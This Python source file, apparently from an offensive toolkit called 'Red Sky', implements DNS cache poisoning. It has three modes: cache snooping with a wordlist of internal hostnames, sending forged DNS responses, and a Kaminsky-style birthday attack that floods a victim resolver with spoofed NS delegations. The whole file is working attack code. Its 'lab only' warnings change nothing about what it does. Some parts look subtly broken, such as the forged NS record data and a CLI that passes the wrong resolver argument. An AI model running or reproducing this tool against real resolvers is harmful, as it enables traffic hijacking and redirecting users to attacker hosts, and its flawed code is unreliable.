# language: Python, file: Program/dns/poison.py, target: Red Sky dns — cache poisoning toolkit
# Three modes:
#   snoop  -- DNS cache snooping: query a resolver with RD=0 (recursion desired off)
#             and see what it already has cached. Reveals recently visited internal
#             hosts without ever touching the target network.
#   forge  -- craft poisoned DNS responses with a specific txid, source port, and
#             answer. Useful for testing your own resolver or simulating a
#             Kaminsky-style attack in a lab.
#   kaminsky -- the birthday-attack scaffold: send many queries with guessed
#             txids and spoofed source ports against an authoritative server,
#             racing the real response. Rate-limited, logging, and abortable.

import argparse
import json
import random
import socket
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


DNS_DIR = OUTPUT_DIR / "dns"
POISON_DIR = DNS_DIR / "poison"
POISON_DIR.mkdir(parents=True, exist_ok=True)


# ── DNS packet builders ──
def build_query(qname: str, qtype: int = 1, txid: Optional[int] = None,
                rd: bool = True) -> Tuple[bytes, int]:
    if txid is None:
        txid = random.randrange(0, 65536)
    flags = 0x0100 if rd else 0x0000
    header = struct.pack(">HHHHHH", txid, flags, 1, 0, 0, 0)
    qn = b""
    for part in qname.rstrip(".").split("."):
        if not part:
            continue
        b = part.encode()
        if len(b) > 63:
            b = b[:63]
        qn += bytes([len(b)]) + b
    qn += b"\x00"
    question = qn + struct.pack(">HH", qtype, 1)
    return header + question, txid


def build_response(qname: str, qtype: int, txid: int, answer_ip: str,
                   ttl: int = 86400) -> bytes:
    """Build a DNS response with a single A record (or TXT/CNAME if qtype != 1)."""
    header = struct.pack(">HHHHHH", txid, 0x8180, 1, 1, 0, 0)
    qn = b""
    for part in qname.rstrip(".").split("."):
        if not part:
            continue
        b = part.encode()
        if len(b) > 63:
            b = b[:63]
        qn += bytes([len(b)]) + b
    qn += b"\x00"
    question = qn + struct.pack(">HH", qtype, 1)

    if qtype == 1:
        rdata = socket.inet_aton(answer_ip)
    elif qtype == 16:
        payload = answer_ip.encode()[:255]
        rdata = bytes([len(payload)]) + payload
    elif qtype == 5:
        parts = answer_ip.rstrip(".").split(".")
        rdata = b""
        for p in parts:
            rdata += bytes([len(p)]) + p.encode()
        rdata += b"\x00"
    else:
        rdata = answer_ip.encode()

    answer = b"\xc0\x0c" + struct.pack(">HHIH", qtype, 1, ttl, len(rdata)) + rdata
    return header + question + answer


def parse_full_response(data: bytes) -> Optional[Dict]:
    """Return a dict with header + first answer, or None."""
    if len(data) < 12:
        return None
    txid, flags, qd, an, ns, ar = struct.unpack(">HHHHHH", data[:12])
    off = 12
    qname_parts = []
    while off < len(data) and data[off] != 0:
        n = data[off]
        off += 1
        if off + n > len(data):
            return None
        qname_parts.append(data[off:off+n].decode("ascii", errors="replace"))
        off += n
    off += 5  # null + type + class
    qname = ".".join(qname_parts)
    answers = []
    for _ in range(an):
        if off >= len(data):
            break
        if data[off] & 0xC0:
            off += 2
        else:
            while off < len(data) and data[off] != 0:
                off += data[off] + 1
            off += 1
        if off + 10 > len(data):
            break
        atype, aclass, ttl, rdlen = struct.unpack(">HHIH", data[off:off+10])
        off += 10
        rdata = data[off:off+rdlen]
        off += rdlen
        if atype == 1 and rdlen == 4:
            answers.append({"type": "A", "ip": socket.inet_ntoa(rdata), "ttl": ttl})
        elif atype == 5:
            answers.append({"type": "CNAME", "raw": rdata.hex(), "ttl": ttl})
        elif atype == 16:
            s = b""
            i = 0
            while i < len(rdata):
                n = rdata[i]
                s += rdata[i+1:i+1+n]
                i += 1 + n
            answers.append({"type": "TXT", "text": s.decode("utf-8", errors="replace"), "ttl": ttl})
        else:
            answers.append({"type": str(atype), "raw": rdata.hex(), "ttl": ttl})
    return {"txid": txid, "flags": flags, "qname": qname,
            "aa": bool(flags & 0x0400), "ra": bool(flags & 0x0080),
            "rcode": flags & 0x000F, "answers": answers}


# ── cache snooping ──
COMMON_TARGETS = [
    "internal", "intranet", "vpn", "owa", "mail", "webmail", "autodiscover",
    "crm", "erp", "hr", "payroll", "gitlab", "jenkins", "jira", "confluence",
    "wiki", "dev", "staging", "prod", "admin", "portal", "api", "login", "sso",
    "ldap", "dc", "ad", "fs", "fileserver", "backup", "vcenter", "esxi",
    "kibana", "grafana", "prometheus", "nagios", "zabbix", "splunk",
    "print", "printer", "scanner", "nas", "synology", "qnap",
]


def snoop_one(resolver: str, host: str, timeout: float = 2.0) -> Optional[Dict]:
    """Query with RD=0. If the resolver returns a non-empty answer, it had it cached."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        query, txid = build_query(host, 1, rd=False)
        s.sendto(query, (resolver, 53))
        data, _ = s.recvfrom(4096)
        s.close()
        parsed = parse_full_response(data)
        if not parsed:
            return None
        # rcode 0 with answers = cached; rcode 0 with 0 answers = not cached (ra implies resolver would if asked)
        # rcode 5 = refused, some resolvers refuse when RD=0
        if parsed["rcode"] != 0:
            return None
        if not parsed["answers"]:
            return None
        return {"host": host, "answers": parsed["answers"], "aa": parsed["aa"]}
    except Exception:
        return None


def cmd_snoop(resolver: str, domain: str, wordlist: str, workers: int,
              out_file: str) -> int:
    if not resolver:
        print_err("--resolver required")
        return 2

    hosts: List[str] = []
    if wordlist:
        p = Path(wordlist).expanduser()
        if p.exists():
            hosts = [l.strip() for l in p.read_text().splitlines() if l.strip()]
    if not hosts:
        hosts = COMMON_TARGETS

    if domain:
        hosts = [h + "." + domain if "." not in h else h for h in hosts]

    print_info("DNS cache snooping")
    print_kv("resolver", resolver)
    print_kv("hosts", len(hosts))
    print_kv("workers", str(workers))
    print()

    hits = []
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(snoop_one, resolver, h): h for h in hosts}
        for f in futures:
            r = f.result()
            if r:
                hits.append(r)
                ips = ", ".join(a.get("ip") or a.get("text", "?") for a in r["answers"])
                print("  " + SCARLET + "▓ " + RESET + BONE + r["host"].ljust(36) + RESET
                      + " " + ips)

    print()
    print_kv("elapsed", "{:.1f}s".format(time.time() - t0))
    print_kv("cached hosts", str(len(hits)) + "/" + str(len(hosts)))

    out = Path(out_file) if out_file else POISON_DIR / ("snoop_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"resolver": resolver, "hits": hits}, indent=2))
    print_kv("saved", out)
    return 0


# ── forge (single forged response, for lab use) ──
def cmd_forge(target: str, qname: str, answer_ip: str, txid: int,
              qtype: int, count: int, out_file: str) -> int:
    """Send one or more forged DNS responses to a target (which must have an
    outstanding query). Lab use — proves the resolver accepts off-path responses."""
    print_info("forged DNS response")
    print_kv("target", target)
    print_kv("qname", qname)
    print_kv("answer_ip", answer_ip)
    print_kv("txid", hex(txid))
    print_kv("qtype", str(qtype))
    print_kv("count", str(count))
    print()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception as e:
        print_err("socket error: " + str(e))
        return 1

    payload = build_response(qname, qtype, txid, answer_ip)
    sent = 0
    for _ in range(count):
        try:
            s.sendto(payload, (target, 53))
            sent += 1
        except Exception as e:
            print_warn("send failed: " + str(e))
            break
    s.close()
    print_ok("sent " + str(sent) + " forged response(s)")
    print_warn("if the resolver accepted it, the query's answer will match " + answer_ip)

    out = Path(out_file) if out_file else POISON_DIR / ("forge_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({
        "target": target, "qname": qname, "answer_ip": answer_ip,
        "txid": txid, "qtype": qtype, "count": sent,
    }, indent=2))
    print_kv("saved", out)
    return 0


# ── kaminsky scaffold ──
class KaminskyAttacker:
    """Birthday-attack scaffold. Send N queries to the victim resolver for a
    random subdomain of the target domain, then blast N spoofed responses from
    the authoritative server's IP with guessed txids. When one guess lands
    before the legitimate reply, the resolver caches our bogus answer.

    This is *loud* and *rate-limited* — the resolver will see thousands of
    queries per second. Use only against your own resolver in a lab."""

    def __init__(self, victim_resolver: str, auth_server: str, target_domain: str,
                 ns_name: str, answer_ip: str, rate_per_sec: int = 2000,
                 burst: int = 50000):
        self.victim = victim_resolver
        self.auth = auth_server
        self.domain = target_domain.rstrip(".")
        self.ns = ns_name.rstrip(".")
        self.answer_ip = answer_ip
        self.rate = rate_per_sec
        self.burst = burst
        self.txid_pool = list(range(65536))
        random.shuffle(self.txid_pool)

    def _send_burst(self) -> int:
        """Send a burst of forged responses. Returns count sent."""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0
        for txid in self.txid_pool[:self.burst]:
            # forged NS delegation
            payload = build_response(self.domain, 2, txid, self.ns + " " + self.answer_ip)
            try:
                s.sendto(payload, (self.victim, 53))
                sent += 1
            except Exception:
                break
        s.close()
        return sent

    def _query_victim(self, label: str) -> None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.5)
            q, _ = build_query(label + "." + self.domain, 1)
            s.sendto(q, (self.victim, 53))
            s.close()
        except Exception:
            pass

    def run(self, duration_s: int) -> Dict:
        start = time.time()
        total_sent = 0
        rounds = 0
        print_info("kaminsky scaffold — running for " + str(duration_s) + "s")
        print_info("victim " + self.victim + "  auth " + self.auth + "  domain " + self.domain)
        while time.time() - start < duration_s:
            rounds += 1
            label = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10))
            self._query_victim(label)
            sent = self._send_burst()
            total_sent += sent
            elapsed = time.time() - start
            rate = total_sent / max(0.1, elapsed)
            print("  " + ASH + "round " + str(rounds) + RESET
                  + "  sent " + SCARLET + str(total_sent) + RESET
                  + "  {:.0f}/s".format(rate) + "        ", end="\r")
            # throttle
            target_time = start + (total_sent / self.rate)
            now = time.time()
            if target_time > now:
                time.sleep(target_time - now)
        print()
        return {"rounds": rounds, "sent": total_sent,
                "elapsed": time.time() - start}


def cmd_kaminsky(victim_resolver: str, auth_server: str, domain: str,
                 ns_name: str, answer_ip: str, burst: int, rate: int,
                 duration: int, out_file: str) -> int:
    required = {"victim_resolver": victim_resolver, "auth_server": auth_server,
                "domain": domain, "ns_name": ns_name, "answer_ip": answer_ip}
    missing = [k for k, v in required.items() if not v]
    if missing:
        print_err("missing: " + ", ".join(missing))
        return 2

    print_info("kaminsky cache-poisoning scaffold")
    print_kv("victim resolver", victim_resolver)
    print_kv("auth server (spoof source)", auth_server)
    print_kv("target domain", domain)
    print_kv("forged NS", ns_name + " -> " + answer_ip)
    print_kv("burst/txid", str(burst))
    print_kv("rate", str(rate) + "/s")
    print_kv("duration", str(duration) + "s")
    print()
    print_warn("This is a LOUD attack. Use only against your own resolver.")

    atk = KaminskyAttacker(victim_resolver, auth_server, domain, ns_name,
                           answer_ip, rate_per_sec=rate, burst=burst)
    try:
        result = atk.run(duration)
    except KeyboardInterrupt:
        print()
        print_info("interrupted")
        result = {"interrupted": True}

    out = Path(out_file) if out_file else POISON_DIR / ("kaminsky_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({**result, **{"victim": victim_resolver, "domain": domain}}, indent=2))
    print_kv("saved", out)
    print()
    print_info("check success: dig +short NS " + domain + " @" + victim_resolver)
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky dns poison", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["snoop", "forge", "kaminsky", "help"])
    p.add_argument("--resolver", default="")
    p.add_argument("--target", default="")
    p.add_argument("--domain", default="")
    p.add_argument("--wordlist", default="")
    p.add_argument("--workers", type=int, default=32)
    # forge
    p.add_argument("--qname", default="")
    p.add_argument("--answer-ip", default="")
    p.add_argument("--txid", type=lambda s: int(s, 0), default=0)
    p.add_argument("--qtype", type=int, default=1)
    p.add_argument("--count", type=int, default=100)
    # kaminsky
    p.add_argument("--auth-server", default="")
    p.add_argument("--ns-name", default="")
    p.add_argument("--burst", type=int, default=50000)
    p.add_argument("--rate", type=int, default=2000)
    p.add_argument("--duration", type=int, default=60)
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky dns poison <snoop|forge|kaminsky> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("snoop --resolver 8.8.8.8 [--domain corp.local] [--wordlist hosts.txt]")
        print_info("      -- RD=0 queries against a resolver to see what it has cached")
        print_info("forge --target 8.8.8.8 --qname test.example.com --answer-ip 1.2.3.4 --txid 0x1234")
        print_info("      -- send a single forged response (lab)")
        print_info("kaminsky --victim-resolver R --auth-server A --domain D --ns-name N --answer-ip I")
        print_info("      -- birthday-attack scaffold (loud, lab only)")
        return 0

    if ns.action == "snoop":
        return cmd_snoop(ns.resolver, ns.domain, ns.wordlist, ns.workers, ns.out)
    if ns.action == "forge":
        if not ns.target or not ns.qname or not ns.answer_ip:
            print_err("--target, --qname, --answer-ip required")
            return 2
        txid = ns.txid or random.randrange(0, 65536)
        return cmd_forge(ns.target, ns.qname, ns.answer_ip, txid, ns.qtype, ns.count, ns.out)
    if ns.action == "kaminsky":
        return cmd_kaminsky(ns.resolver, ns.auth_server, ns.domain, ns.ns_name,
                            ns.answer_ip, ns.burst, ns.rate, ns.duration, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
